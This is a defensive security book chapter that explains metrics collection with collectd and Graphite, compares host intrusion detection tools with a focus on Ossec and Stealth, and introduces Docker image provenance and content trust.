<p>Graphite has excellent <a href="https://graphite.readthedocs.io/en/latest/">official</a> and <a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-graphite-on-an-ubuntu-14-04-server">community</a> provided documentation.</p>

<p>There are a large number of <a href="http://graphite.readthedocs.org/en/latest/tools.html">tools</a> that can be integrated with graphite.</p>

<p>Graphite can take <a href="https://kevinmccarthy.org/2013/07/18/10-things-i-learned-deploying-graphite/">some work</a> to deploy, This can be made easier several ways. You could deploy it with your favourite configuration management tool, such as with an <a href="https://github.com/dmichel1/ansible-graphite">ansible-graphite</a> playbook, or perhaps with one of the many collectd-graphite-docker type containers.</p>

<p>You can even do better than graphite by adding the likes of <a href="">Grafana</a></p>

<h6 id="leanpub-auto-assembling-the-components">Assembling the Components</h6>

<p>Collectd can be used to send statistics locally or remotely. It can be setup as an agent and server, along with Graphite on a <a href="https://www.digitalocean.com/community/tutorials/how-to-configure-collectd-to-gather-system-metrics-for-graphite-on-ubuntu-14-04">single machine</a>.</p>

<p>Another common deployment scenario which is more interesting is to have a collection of hosts (clients/agents) that all require statistics gathering from them, and a server that listens for the data coming from all of the clients/agents. Let us see <a href="https://pradyumnajoshi.blogspot.co.nz/2015/11/setting-up-collectd-based-monitoring.html">how this looks</a>:</p>

<ol class="numeric">
  <li>graphing server (1)
    <ol class="numeric">
      <li>
<a href="https://www.digitalocean.com/community/tutorials/how-to-install-and-use-graphite-on-an-ubuntu-14-04-server">install, configure</a>, and run <a href="https://graphite.readthedocs.io/en/latest/install.html">graphite</a>
</li>
      <li>Install collectd: If you are using a recent Ubuntu or Debian release, then more than likely you will be able to just install the distributions <a href="https://packages.debian.org/stretch/collectd"><code>collectd</code></a> (which depends on <a href="https://packages.debian.org/stretch/collectd-core"><code>collectd-core</code></a> which includes many plugins) and <a href="https://packages.debian.org/stretch/collectd-utils"><code>collectd-utils</code></a>
</li>
      <li>Configure collectd to use the following plugins, which will also require their own configuration:
        <ul>
          <li>Network (read, write)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Write_Graphite">Write_Graphite</a> (write)</li>
        </ul>
      </li>
    </ol>
  </li>
  <li>collection agents (1:n)
    <ol class="numeric">
      <li>Install collectd</li>
      <li>Configure collectd to use the following plugins, which will also require their own configuration:
        <ul>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Network">Network</a> (read, write)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:CPU">CPU</a> (read)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Load">Load</a> (read)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Memory">Memory</a> (read)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Disk">Disk</a> (read)</li>
          <li>
<a href="https://collectd.org/wiki/index.php/Plugin:Processes">Processes</a> (read)</li>
          <li>Any other read plugins from <a href="https://collectd.org/wiki/index.php/Table_of_Plugins">the list</a> that you would like to collect statistics for</li>
        </ul>
      </li>
    </ol>
  </li>
</ol>

<p id="vps-countermeasures-lack-of-visibility-statistics-graphing-assembling-the-components-after">In this case, each collectd agent is sending its statistics from its Network plugin to the graphing servers network interface (achieving the same result as the below netcat command), which is picked up by the collectd Network plugin and flows through to the collectd <code>write_graphite</code> plugin, which sends the <a href="https://collectd.org/wiki/index.php/Plugin:Write_Graphite#Example_data">statistics</a> using the plain text transfer protocol (metric-name actual-value timestamp-in-epoch) to graphites listening service called carbon (usually to <a href="https://graphite.readthedocs.io/en/latest/carbon-daemons.html#carbon-cache-py">port 2003</a>). Carbon only accepts a single value per interval, which is <a href="https://graphite.readthedocs.io/en/latest/config-carbon.html#storage-schemas-conf">10 seconds by default</a>. Carbon writes the data to the whisper library which is responsible for storing to its data files. graphite-web reads the data points from the wisper files, and provides user interface and API for rendering dashboards and graphs. </p>

<figure class="code">
<div class="highlight"><pre><code></code><code class="nb">echo</code> <code class="s2">"&lt;metric-name&gt; &lt;actual-value&gt; `date +%s`"</code> <code class="p">|</code> nc -q0 graphing-server <code class="m">2003</code>
</pre></div>

</figure>


<figure class="image center" style="width: 396px;">
  <img src="images/collectd-graphite.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>I also looked into <a href="https://raygun.com/">Raygun</a> which provides visibility into many aspects of your applications. Raygun is an all-in-one offering, but does not focus on server statistics.</p>

<h5 id="vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids">Host Intrusion Detection Systems (HIDS)</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>I recently performed an in-depth evaluation of a couple of great HIDS available. The choice of which candidates to take into the second round came from an initial evaluation of a larger collection of HIDS. First I will briefly discuss the full collection I looked at, as these also have some compelling features and reasons as to why you may want to use them in your own VPSs. I will then discuss the two that I was the most impressed with, and dive into some more details around the winner, why, and how I had it configured and running in my lab.</p>

<p>The best time to install a HIDS is on a fresh installed system before you open the host up to the internet or even your LAN, especially if it is corporate. Of course if you do not have that luxury, there are a bunch of tools that can help you determine if you are already owned. Be sure to run one or more over your target system(s) before your HIDS bench-marks it, otherwise you could be bench-marking an already compromised system.</p>

<h6 id="leanpub-auto-tripwirehttpspackagesdebianorgstretchtripwire">
  <a href="https://packages.debian.org/stretch/tripwire">Tripwire</a>
</h6>

<p>Is a HIDS that stores a good known state of vital system files of your choosing and can be set-up to notify an administrator upon change in the files. Tripwire stores cryptographic hashes (deltas) in a database and compares them with the files it has been configured to monitor changes on. DigitalOcean had a <a href="https://www.digitalocean.com/community/tutorials/how-to-use-tripwire-to-detect-server-intrusions-on-an-ubuntu-vps">tutorial</a> on setting Tripwire up. Most of what you will find around Tripwire now are the commercial offerings.</p>

<h6 id="leanpub-auto-rkhunterhttpspackagesdebianorgstretchrkhunter">
  <a href="https://packages.debian.org/stretch/rkhunter">RkHunter</a>
</h6>

<p>Is a similar <a href="http://rkhunter.sourceforge.net/">offering</a> to Tripwire for POSIX compliant systems. RkHunter scans for rootkits, backdoors, checks on the network interfaces and local exploits by testing for:</p>

<ul>
  <li>MD5 hash changes</li>
  <li>Files commonly created by root-kits</li>
  <li>Wrong file permissions for binaries</li>
  <li>Suspicious strings in kernel modules</li>
  <li>Hidden files in system directories</li>
  <li>Optionally scan within plain-text and binary files</li>
</ul>

<p>Version 1.4.2 (24/02/2014) now checks the <code>ssh</code>, <code>sshd</code> and <code>telent</code>, although you should not have telnet installed. This could be useful for mitigating non-root users running a trojanised sshd on a 1025-65535 port. You can run ad-hoc scans, then set them up to be run with cron. Debian Jessie has this release in its repository. Any Debian distro before Jessie is on 1.4.0-1 or earlier.</p>

<p>The latest version you can install for Linux Mint Rosa (17.3) within the repositories is 1.4.0-3 (01/05/2012). Linux Mint Sarah (18) within the repositories is 1.4.2-5</p>

<h6 id="leanpub-auto-chkrootkithttpspackagesdebianorgstretchchkrootkit">
  <a href="https://packages.debian.org/stretch/chkrootkit">Chkrootkit</a>
</h6>

<p>It is a good idea to run a couple of these types of scanners. Hopefully what one misses the other will not. Chkrootkit scans for many system programs, some of which are cron, crontab, date, echo, find, grep, su, ifconfig, init, login, ls, netstat, sshd, top and many more. All the usual targets for attackers to modify. You can specify if you do not want them all scanned. Chkrootkit runs tests such as:</p>

<ul>
  <li>System binaries for rootkit modification</li>
  <li>If the network interface is in promiscuous mode</li>
  <li>lastlog deletions</li>
  <li>wtmp and utmp deletions (logins, logouts)</li>
  <li>Signs of LKM trojans</li>
  <li>Quick and dirty strings replacement</li>
</ul>

<h6 id="vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-unhide">
  <a href="http://www.unhide-forensics.info/">Unhide</a>
</h6>

<p>While not strictly a HIDS, Unhide is quite a useful forensics tool for working with your system if you suspect it may have been compromised.</p>

<p>Unhide is a forensic tool to find hidden processes and TCP/UDP ports by rootkits / LKMs or by another hidden technique. Unhide runs on Unix/Linux and Windows Systems. It implements six main techniques.</p>

<ol class="numeric">
  <li>Compare <code>/proc</code> vs <code>/bin/ps</code> output</li>
  <li>Compare info gathered from <code>/bin/ps</code> with info gathered by walking through the <code>procfs</code> (ONLY for unhide-linux version).</li>
  <li>Compare info gathered from <code>/bin/ps</code> with info gathered from <code>syscalls</code> (syscall scanning)</li>
  <li>Full PIDs space occupation (PIDs brute-forcing) (ONLY for unhide-linux version).</li>
  <li>Compare <code>/bin/ps</code> output vs <code>/proc</code>, <code>procfs</code> walking and <code>syscall</code> (ONLY for unhide-linux version). Reverse search, verify that all threads seen by <code>ps</code> are also seen in the <code>kernel</code>.</li>
  <li>Quick compare <code>/proc</code>, <code>procfs</code> walking and <code>syscall</code> vs <code>/bin/ps</code> output (ONLY for unhide-linux version). This technique is about 20 times faster than tests 1+2+3 but may give more false positives.</li>
</ol>

<p>Unhide includes two utilities: unhide and unhide-tcp.</p>

<p>unhide-tcp identifies TCP/UDP ports that are listening but are not listed in /bin/netstat through brute forcing of all TCP/UDP ports available.</p>

<p>Can also be used by rkhunter in its daily scans. Unhide was number one in the top 10 toolswatch.org security tools pole</p>

<h6 id="leanpub-auto-ossec">Ossec</h6>

<p>Is a HIDS that also has some preventative features. This is a pretty comprehensive offering with a lot of great features.</p>

<h6 id="leanpub-auto-stealthhttpsfbb-gitgithubiostealth">
  <a href="https://fbb-git.github.io/stealth/">Stealth</a>
</h6>

<p>The idea of Stealth is to do a similar job as the above file integrity checkers, but to leave almost no sediments on the tested computer (called the client). A potential attacker therefore does not necessarily know that Stealth is in fact checking the integrity of its clients files. Stealth is installed on a different machine (called the controller) and scans over SSH.</p>

<p>The faster you can respond to an attacker modifying system files, the more likely you are to circumvent their attempts. Ossec provides real-time cheacking. Stealth provides agent-less (runs from another machine) checking, using the checksum programme of your choice that it copies to the controller on first run, ideally before it is exposed in your DMZ.</p>

<h6 id="vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec">Deeper with Ossec</h6>

<p>You can find the source on <a href="https://github.com/ossec/ossec-hids">github</a></p>

<p>
  <strong>Who is Behind Ossec?</strong>
</p>

<p>Many developers, contributors, managers, reviewers, translators. Infact the <a href="https://ossec.github.io/about.html#ossec-team">OSSEC team</a> looks almost as large as the <a href="https://qa.debian.org/popcon.php?package=stealth">Stealth user base</a>, well, that is a slight exaggeration.</p>

<p>
  <strong>Documentation</strong>
</p>

<p>There is Lots of documentation. It is not always the easiest to navigate because you have to understand so much up front. There is lots of buzz on the inter-webs and there are several books.</p>

<ul>
  <li>The main documentation is on <a href="https://ossec.github.io/docs/">github</a>
</li>
  <li>Similar docs on <a href="https://ossec-docs.readthedocs.io/en/latest/">readthedocs.io</a>
</li>
  <li>Mailing list on <a href="https://groups.google.com/forum/#!forum/ossec-list">google groups</a>
</li>
  <li>Several good looking books
    <ol class="numeric">
      <li>Book one (<a href="https://www.amazon.com/Instant-Host-based-Intrusion-Detection-System/dp/1782167641/">Instant OSSEC Host-based Intrusion Detection System</a>)</li>
      <li>Book two (<a href="https://www.amazon.com/OSSEC-Host-Based-Intrusion-Detection-Guide/dp/159749240X">OSSEC Host-Based Intrusion Detection Guide</a>)</li>
      <li>Book three (<a href="https://blog.savoirfairelinux.com/en/tutorials/free-ebook-ossec-how-to-the-quick-and-dirty-way/">OSSEC How-To  The Quick And Dirty Way</a>)</li>
    </ol>
  </li>
  <li><a href="https://ossec.github.io/blog/posts/2014-05-12-OSSEC-Commercial-Support-Contracts.markdown.html">Commercial Support</a></li>
  <li><a href="https://ossec-docs.readthedocs.io/en/latest/faq/index.html">FAQ</a></li>
  <li><a href="http://ossec.alienvault.com/repos/apt/debian/dists/jessie/main/binary-amd64/Packages">Package meta-data</a></li>
</ul>

<p>
  <strong>Community / Communication</strong>
</p>

<p>IRC channel #ossec on irc.freenode.org Although it is not very active.</p>

<p>
  <strong>Components</strong>
</p>

<ul>
  <li>
<a href="https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html#manager-or-server">Manager</a> (sometimes called server): does most of the work monitoring the Agents. It stores the file integrity checking databases, the logs, events and system auditing entries, rules, decoders, major configuration options.</li>
  <li>
<a href="https://ossec-docs.readthedocs.io/en/latest/manual/agent/index.html">Agents</a>: small collections of programs installed on the machines we are interested in monitoring. Agents collect information and forward it to the manager for analysis and correlation.</li>
</ul>

<p>There are quite a few other ancillary components also.</p>

<p>
  <strong>
    <a href="https://ossec-docs.readthedocs.io/en/latest/manual/ossec-architecture.html">Architecture</a>
  </strong>
</p>

<p>You can also go the <a href="https://ossec-docs.readthedocs.io/en/latest/manual/agent/agentless-monitoring.html">agent-less</a> route which may allow the Manager to perform file integrity checks using <a href="http://ossec-docs.readthedocs.org/en/latest/manual/agent/agentless-scripts.html">agent-less scripts</a>. As with Stealth, you have still got the issue of needing to be root in order to read some of the files.</p>

<p>Agents can be installed on VMware ESX but from what I have read it is quite a bit of work.</p>

<p>
  <strong><a href="https://ossec.github.io/docs/manual/non-technical-overview.html?page_id=165">Features</a> in a nut-shell</strong>
</p>

<ul>
  <li>File integrity checking</li>
  <li>Rootkit detection</li>
  <li>Real-time log file monitoring and analysis (you may already have something else doing this)</li>
  <li>Intrusion Prevention System (IPS) features as well: blocking attacks in real-time</li>
  <li>Alerts can go to a databases MySQL or PostgreSQL or other types of <a href="https://ossec-docs.readthedocs.io/en/latest/manual/output/index.html">outputs</a>
</li>
  <li>There is a PHP web UI that runs on Apache if you would rather look at pretty outputs vs log files.</li>
</ul>

<p>
  <strong>What I like</strong>
</p>

<p>To me, the ability to scan in real-time off-sets the fact that the agents in most cases have binaries installed. This hinders the attacker from <a href="chap03.html#vps-identify-risks-lack-of-visibility">covering their tracks</a>.</p>

<p>Can be configured to scan systems in <a href="https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#realtime-options">real</a><a href="https://ossec-docs.readthedocs.io/en/latest/manual/syscheck/index.html#real-time-monitoring">time</a> based on <a href="https://en.wikipedia.org/wiki/Inotify">inotify</a> events.</p>

<p>Backed by a large company Trend Micro.</p>

<p>Options: Install options for starters. You have the options of:</p>

<ul>
  <li>Agent-less installation as described above</li>
  <li>Local installation: Used to secure and protect a single host</li>
  <li>Agent installation: Used to secure and protect hosts while reporting back to a central OSSEC server</li>
  <li>Server installation: Used to aggregate information</li>
</ul>

<p>Can install a web UI on the manager, so you need Apache, PHP, MySQL.</p>

<p>If you are going to be checking many machines, OSSEC will scale.</p>

<p>
  <strong>What I like less</strong>
</p>

<ul>
  <li>Unlike Stealth, The fact that something usually has to be installed on the agents</li>
  <li>The packages are not in the standard repositories. The downloads, PGP keys and directions are here: <a href="https://ossec.github.io/downloads.html">https://ossec.github.io/downloads.html</a>.</li>
  <li>I think Ossec may be doing to much and if you do not like the way it does one thing, you may be stuck with it. Personally I really like the idea of a tool doing one thing, doing it well and providing plenty of configuration options to change the way it does its one thing. This provides huge flexibility and minimises your dependency on a suite of tools and/or libraries</li>
  <li>Information overload. There seems to be a lot to get your head around to get it set-up. There are a lot of install options documented (books, inter-webs, official docs). It takes a bit to workout exactly the best procedure for your environment, in saying that it does have scalability on its side.</li>
</ul>

<h6 id="vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth">Deeper with Stealth</h6>

<p>And why it rose to the top.</p>

<p>You can find the source on <a href="https://github.com/fbb-git/stealth">github</a></p>

<p>
  <strong>Who is Behind Stealth?</strong>
</p>

<p>Author: Frank B. Brokken. An admirable job for one person. Frank is not a fly-by-nighter though. Stealth was first presented to Congress in 2003. It is still actively maintained and used by a few. It is one of GNU/Linuxs dirty little secrets I think. It is a great idea implemented, makes a tricky job simple and does it in an elegant way.</p>

<p>
  <strong>
    <a href="https://fbb-git.github.io/stealth/">Documentation</a>
  </strong>
</p>

<p>All hosted on github.</p>

<ul>
  <li>
<a href="https://packages.debian.org/stretch/stealth">4.01.05 (2016-05-14)</a>
    <ul>
      <li><a href="https://fbb-git.github.io/stealth/stealthman.html">man page</a></li>
      <li><a href="https://fbb-git.github.io/stealth/html/stealth.html">user guide</a></li>
    </ul>
  </li>
</ul>

<p>Once you install Stealth, all the documentation can be found by <code>sudo updatedb &amp;&amp; locate stealth</code>. I most commonly used: HTML docs <code>/usr/share/doc/stealth-doc/manual/html/</code> and <code>/usr/share/doc/stealth-doc/manual/pdf/stealth.pdf</code> for easy searching across the HTML docs.</p>

<ul>
  <li>man page <code>/usr/share/doc/stealth/stealthman.html</code>
</li>
  <li>Examples: <code>/usr/share/doc/stealth/examples/</code>
</li>
</ul>

<p>
  <strong>Binaries</strong>
</p>

<p>Debian Stretch: has <a href="https://packages.debian.org/stretch/stealth">4.01.05-1</a></p>

<p>Linux Mint 18 (Sarah) has <a href="https://community.linuxmint.com/software/view/stealth">4.01.04-1</a></p>

<p>Last time I installed Stealth I had to either go out of band to get a recent version or go with a much older version. These repositories now have very recent releases though.</p>

<p>
  <strong>Community / Communication</strong>
</p>

<p>There is no community really. I see it as one of the dirty little secretes that I am surprised many diligent sys-admins have not jumped on. The author is happy to answer emails. The author is more focussed on maintaining a solid product than marketing.</p>

<p>
  <strong>Components</strong>
</p>

<ol class="numeric">
  <li>
<strong>Monitor</strong> The computer initiating the check.<br />
    <ul>
      <li>Needs two kinds of outgoing services:
        <ol class="numeric">
          <li>SSH to reach the clients</li>
          <li>Mail transport agent (MTA)(sendmail, postfix)</li>
        </ol>
      </li>
      <li>Considerations for the Monitor:
        <ol class="numeric">
          <li>No public access</li>
          <li>All inbound services should be denied</li>
          <li>Access only via its console</li>
          <li>Physically secure location</li>
          <li>Sensitive information of the clients are stored on the Monitor</li>
          <li>Password-less access to the clients for anyone who gains Monitor root access, unless either:
            <ul>
              <li>You are happy to enter a pass-phrase when ever your Monitor is booted so that Stealth can use SSH to access the client(s). The Monitor could stay running for years, so this may not pose a problem. I suggest using some low powered computer like a Raspberry Pie as your monitoring device, hooked up to a UPS. Also keep in mind that if you wan to monitor files on Client(s) with root permissions, you will have to SSH in as root (which is why it is recommended that the Monitor not accept any incoming connections, and be in a physically safe location). An alternative to having the Monitor log in as root is to have something like Monit take care of integrity checking the Client files with root permissions and have Stealth monitor the non root files and Monit.</li>
              <li>
<a href="https://fbb-git.github.io/ssh-cron/">ssh-cron</a> is used  </li>
            </ul>
          </li>
        </ol>
      </li>
    </ul>
  </li>
  <li>
<strong>Client</strong> The computer(s) being monitored. I do not see any reason why a Stealth solution could not be set-up to look after many clients.</li>
</ol>

<p>
  <strong>Architecture</strong>
</p>

<p>The Monitor stores one to many policy files. Each of which is specific to a single client and contains <code>USE</code> directives and commands. Its recommended policy to take copies of the client utilities such as the hashing programme <code>sha1sum</code>, <code>find</code> and others that are used extensively during the integrity scans and copy them to the Monitor to take bench-mark hashes. Subsequent runs will do the same to compare with the initial hashes stored before the client utilities are trusted.</p>

<p>
  <strong>Features in a nut-shell</strong>
</p>

<p>File integrity tests leaving virtually no sediments on the tested client.</p>

<p>Stealth subscribes to the dark cockpit approach. I.E. no mail is sent when no changes are detected. If you have a MTA, Stealth can be configured to send emails on changes it finds.</p>

<p id="vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-stealth-what-i-like">
  <strong>What I like</strong>
</p>

<ul>
  <li>Its simplicity. There is one package to install on the Monitor. Nothing to install on the client machines. The Client just needs to have the Monitors SSH public key. You will need a Mail Transfer Agent on your Monitor if you do not already have one. My test machine (Linux Mint) did not have one.</li>
  <li>Rather than just modifying the likes of <code>sha1sum</code> on the clients that Stealth uses to perform its integrity checks, Stealth would somehow have to be fooled into thinking that the changed hash of the <code>sha1sum</code> it has just copied to the Monitor is the same as the previously recorded hash that it did the same with. If the previously recorded hash is removed or does not match the current hash, then Stealth will fire an alert off.</li>
  <li>It is in the Debian repositories</li>
  <li>The whole idea behind it. Systems being monitored give little appearance that they are being monitored, other than I think the presence of a single SSH login when Stealth first starts in the <code>auth.log</code>. This could actually be months ago, as the connection remains active for the life of Stealth. The login could be from a user doing anything on the client. It is very discrete.</li>
  <li>Unpredictability of Stealth runs is offered through Stealths <code>--random-interval</code> and <code>--repeat</code> options. E.g. <code>--repeat 60 --random-interval 30</code> results in new Stealth-runs on average every 75 seconds. It can usually take a couple of minutes to check all the important files on a file system, so you would probably want to make the checks several minutes apart from each other.</li>
  <li>Subscribes to the Unix philosophy: do one thing and do it well</li>
  <li>Stealths author is very approachable and open. After talking with Frank and suggesting some ideas to promote Stealth and its community, Frank started a <a href="http://sourceforge.net/p/stealth/discussion/">discussion list</a>. Now that Stealth is moved to github, issues can be submitted easily. If you use Stealth and have any trouble, Frank is very easy to work with.</li>
</ul>

<p>
  <strong>What I like less</strong>
</p>

<ul>
  <li>Lack of visible code reviews and testing. Yes it is in Debian, but so was <a href="http://heartbleed.com/">OpenSSL</a> and <a href="https://security-tracker.debian.org/tracker/CVE-2014-6271">Bash</a>
</li>
  <li>One man band. Support provided via one person alone via email, although now it is on github, it should be easier if / when the need arises. Comparing with the likes of Ossec which has <a href="chap03.html#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids-deeper-with-ossec">quite a few</a>.</li>
  <li>Lack of use cases. I did not see anyone using / abusing it. Although Frank did send me some contacts of other people that are using it, so again, a very helpful author. There is not much in the way of use cases on the interwebs. The documentation had clear signs that it was written and targeted people already familiar with the tool. This is understandable as the author has been working on this project for many years and could possibly be disconnected with what is involved for someone completely new to the project to dive in and start using it. In saying that, that is what I did and after a bit of struggling it worked out well.</li>
  <li>Small user base, revealed by the <a href="https://qa.debian.org/popcon.php?package=stealth">debian popcon</a>.</li>
</ul>

<h6 id="leanpub-auto-outcomes">Outcomes</h6>

<p>In making all of my considerations, I changed my mind quite a few times on which offerings were most suited to which environments. I think this is actually a good thing, as I think it means my evaluations were based on the real merits of each offering rather than any biases.</p>

<p>The simplicity of Stealth, flatter learning curve and its over-all philosophy is what won me over. Although, I think if you have to monitor many Agents / Clients, then Ossec would be an excellent option, as I think it would scale well.</p>

<h6 id="leanpub-auto-stealth-up-and-running">Stealth Up and Running</h6>

<p>I installed stealth and stealth-doc via synaptic package manager. Then just did a <code>locate</code> for stealth to find the docs and other example files. The following are the files I used for documentation, how I used them and the tab order that made sense to me:</p>

<ol class="numeric">
  <li>The main documentation index:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth.html">file:///usr/share/doc/stealth-doc/manual/html/stealth.html</a>
</li>
  <li>Chapter one introduction:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth01.html">file:///usr/share/doc/stealth-doc/manual/html/stealth01.html</a>
</li>
  <li>Chapter four to help build up a policy file:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth04.html">file:///usr/share/doc/stealth-doc/manual/html/stealth04.html</a>
</li>
  <li>Chapter five for running Stealth and building up the policy file:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth05.html">file:///usr/share/doc/stealth-doc/manual/html/stealth05.html</a>
</li>
  <li>Chapter six for running Stealth:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth06.html">file:///usr/share/doc/stealth-doc/manual/html/stealth06.html</a>
</li>
  <li>Chapter seven for arguments to pass to Stealth:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth07.html">file:///usr/share/doc/stealth-doc/manual/html/stealth07.html</a>
</li>
  <li>Chapter eight for error messages:<br />
<a href="file:///usr/share/doc/stealth-doc/manual/html/stealth08.html">file:///usr/share/doc/stealth-doc/manual/html/stealth08.html</a>
</li>
  <li>The Man page: <a href="file:///usr/share/doc/stealth/stealthman.html">file:///usr/share/doc/stealth/stealthman.html</a>
</li>
  <li>Policy file examples: <a href="file:///usr/share/doc/stealth/examples/">file:///usr/share/doc/stealth/examples/</a>
</li>
  <li>Useful scripts to use with Stealth: <a href="file:///usr/share/doc/stealth/scripts/usr/bin/">file:///usr/share/doc/stealth/scripts/usr/bin/</a>
</li>
  <li>All of the documentation in simple text format (good for searching across chapters for strings): <a href="file:///usr/share/doc/stealth-doc/manual/text/stealth.txt">file:///usr/share/doc/stealth-doc/manual/text/stealth.txt</a>
</li>
</ol>

<p>The files I would need to copy and modify were:</p>

<ul>
  <li><code>/usr/share/doc/stealth/scripts/usr/bin/stealthcleanup.gz</code></li>
  <li><code>/usr/share/doc/stealth/scripts/usr/bin/stealthcron.gz</code></li>
  <li><code>/usr/share/doc/stealth/scripts/usr/bin/stealthmail.gz</code></li>
</ul>

<p>Files I used for reference to build up the policy file:</p>

<ul>
  <li><code>/usr/share/doc/stealth/examples/demo.pol.gz</code></li>
  <li><code>/usr/share/doc/stealth/examples/localhost.pol.gz</code></li>
  <li><code>/usr/share/doc/stealth/examples/simple.pol.gz</code></li>
</ul>

<p>As mentioned above, providing you have a working MTA, then Stealth will just do its thing when you run it. The next step is to schedule its runs. This can be also (as mentioned above) with a pseudo random interval.</p>

<h4 id="vps-countermeasures-docker">Docker</h4>

<p>It is my intention to provide a high level over view of the concepts you will need to know in order to establish a somewhat secure environment around the core Docker components and your containers. There are many resources available, and the Docker security team is hard at work constantly trying to make the task of improving security around Docker easier.</p>

<p>Do not forget to check the <a href="chap07.html#additional-resources-vps-countermeasures-docker">Additional Resources</a> section for material to be consumed in parallel with the Docker Countermeasures, such as the excellent CIS Docker Benchmark and an <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">interview</a> of the Docker Security Team Lead I carried out with Diogo Mnica.</p>

<p>Cisecurity has an <a href="https://benchmarks.cisecurity.org/tools2/docker/CIS_Docker_1.13.0_Benchmark_v1.0.0.pdf">excellent resource</a> for hardening docker images which the Docker Security team helped with.</p>

<h5 id="vps-countermeasures-docker-consumption-from-registries">Consumption from Registries</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p><em>Docker Security Scanning is available as an add-on to Docker hosted private repositories on both Docker Cloud and Docker Hub.</em>, you also have to <a href="https://docs.docker.com/docker-cloud/builds/image-scan/#/opt-in-to-docker-security-scanning">opt in</a> and pay for it. Docker Security Scanning is also now available on the new <a href="https://blog.docker.com/2017/03/docker-enterprise-edition/">Enterprise Edition</a>. The scan compares the SHA of each component in the image with those in an up to date CVE database for known vulnerabilities. This is a good start, but not free and does not do enough. Images are scanned on push and the results indexed so that when new CVE databases are available, comparisons can continue to be made.</p>

<p>Its up to the person consuming images from docker hub to assess whether or not they have vulnerabilities in them. Whether un-official or <a href="https://github.com/docker-library/official-images">official</a>, it is your responsibility. Check the <a href="chap03.html#vps-countermeasures-docker-hardening-docker-host-engine-and-containers">Hardening Docker Host, Engine and Containers</a> section for tooling to assist with finding vulnerabilities in your Docker hosts and images.</p>

<p>Your priority before you start testing images for vulnerable contents, is to understand the following:</p>

<ol class="numeric">
  <li>Where your image originated from</li>
  <li>Who created it</li>
  <li>Image provenance: Is Docker fetching the <a href="https://docs.docker.com/engine/docker-overview/#docker-objects">image</a> we think it is?
    <ol class="numeric">
      <li>Identification: How Docker uses secure hashes, or digests.<br />
 Image layers (deltas) are created during the image build process, and also when commands within the container are run which produce new or modified files and/or directories.<br />
 Layers are now identified by a digest which looks like:
 <code>sha256:&lt;the-hash&gt;</code><br />
 The above hash element is created by applying the SHA256 hashing algorithm to the layers content.<br />
 The image ID is also the hash of the configuration object which contains the hashes of all the layers that make up the images copy-on-write filesystem definition, also discussed in my <a href="http://www.se-radio.net/2017/05/se-radio-episode-290-diogo-monica-on-docker-security/">Software Engineering Radio show</a> with Diogo Mnica.</li>
      <li>Integrity: How do you know that your image has not been tampered with?<br />
 This is where secure signing comes in with the <a href="https://blog.docker.com/2015/08/content-trust-docker-1-8/">Docker Content Trust</a> feature. Docker Content Trust is enabled through an integration of <a href="https://github.com/docker/notary">Notary</a> into the Docker Engine. Both the Docker image producing party and image consuming party need to opt-in to use Docker Content Trust. By default, it is disabled. In order to do that, Notary must be downloaded and setup by both parties, and the <code>DOCKER_CONTENT_TRUST</code> environment variable <a href="https://docs.docker.com/engine/security/trust/content_trust/#/enable-and-disable-content-trust-per-shell-or-per-invocation">must be set</a> to <code>1</code>, and the <code>DOCKER_CONTENT_TRUST_SERVER</code> must be <a href="https://docs.docker.com/engine/reference/commandline/cli/#environment-variables">set to the URL</a> of the Notary server you setup.  
        <p>Now the producer can sign their image, but first, they need to <a href="https://docs.docker.com/engine/security/trust/trust_delegation/">generate a key pair</a>. Once they have done that, when the image is pushed to the registry, it is signed with their private (tagging) key.</p>

        <p>When the image consumer pulls the signed image, Docker Engine uses the publishers public (tagging) key to verify that the image you are about to run is cryptographically identical to the image the publisher pushed.</p>

        <p>Docker Content Trust also uses the Timestamp key when publishing the image, this makes sure that the consumer is getting the most recent image on pull.</p>

        <p>Notary is based on a Go implementation of <a href="https://theupdateframework.github.io/">The Update Framework (TUF)</a>  </p>
      </li>
      <li>By specifying a digest tag in a <code>FROM</code> instruction in your <code>Dockerfile</code>, when you <code>pull</code> the same image will be fetched.</li>
    </ol>
  </li>
</ol>

<h5 id="leanpub-auto-doppelganger-images-1">Doppelganger images</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionAVERAGE.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


<p>If you are already doing the last step from above, then fetching an image with a very similar name becomes highly unlikely.</p>

<h5 id="vps-countermeasures-docker-the-default-user-is-root">The Default User is Root</h5>

<figure class="image center" style="width: 396px;">
  <img src="images/ThreatTags----PreventionVERYEASY.png" alt="" style="width: 100%;" />
  <figcaption></figcaption>
</figure>


